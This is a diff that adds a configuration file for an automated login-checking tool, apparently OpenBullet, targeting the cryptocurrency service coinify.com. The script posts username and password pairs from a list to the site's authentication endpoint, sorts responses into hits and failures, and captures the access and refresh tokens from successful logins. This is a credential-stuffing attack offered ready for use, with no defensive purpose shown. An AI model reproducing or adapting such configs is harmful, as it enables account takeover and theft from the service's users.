@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "coinify.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-29T02:29:38.9126784+02:00",
+  "AdditionalInfo": "",
+  "Author": "r37z",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://app-api.coinify.com/auth" 
+  CONTENT "grant_type=password&partnerId=11&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://app.coinify.com" 
+  HEADER "Referer: https://app.coinify.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+
+!PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+!PARSE "<SOURCE>" JSON "refresh_token" -> VAR "refresh_token" 
+
